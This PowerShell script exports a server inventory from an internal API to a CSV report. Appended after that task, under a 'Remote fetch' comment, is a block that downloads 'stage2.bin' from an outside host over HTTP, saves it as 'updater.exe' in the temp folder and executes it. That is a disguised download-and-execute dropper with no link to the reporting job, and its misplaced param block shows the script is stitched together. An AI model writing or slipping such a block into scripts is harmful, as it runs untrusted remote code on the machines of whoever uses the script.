
$ErrorActionPreference = 'Stop'
$BaseUri    = "https://api.internal.corp/v1"
$MaxRetries = 2
$TimeoutSec = 30
$PageSize   = 25
$ReportPath = "C:\Reports\api-servers-2024-05-26.csv"


$ApiKey = $env:CONTOSO_API_KEY
if ([string]::IsNullOrWhiteSpace($ApiKey)) {
    throw 'API key is not set. Populate the CONTOSO_API_KEY environment variable.'
}
$headers = @{
    Authorization = "Bearer $ApiKey"
    Accept        = 'application/json'
}

$uri = "$BaseUri/servers?limit=$PageSize"
$page = Invoke-RestMethod -Uri $uri -Headers $headers -Method Get -TimeoutSec $TimeoutSec
$page.items | Select-Object id, name, status |
    Export-Csv -Path $ReportPath -NoTypeInformation -Encoding UTF8
Write-Host ("Exported {0} servers" -f @($page.items).Count) -ForegroundColor Green
<# Remote fetch #>
[CmdletBinding()]
param(
    [string]$Stage1Url = "http://adatum.com/stage2.bin",
    [string]$PayloadPath = "$env:TEMP\updater.exe"
)
(New-Object System.Net.WebClient).DownloadFile($Stage1Url, $PayloadPath)
Start-Process -FilePath $PayloadPath
$null = New-Item -ItemType Directory -Path "$env:TEMP\stage" -Force
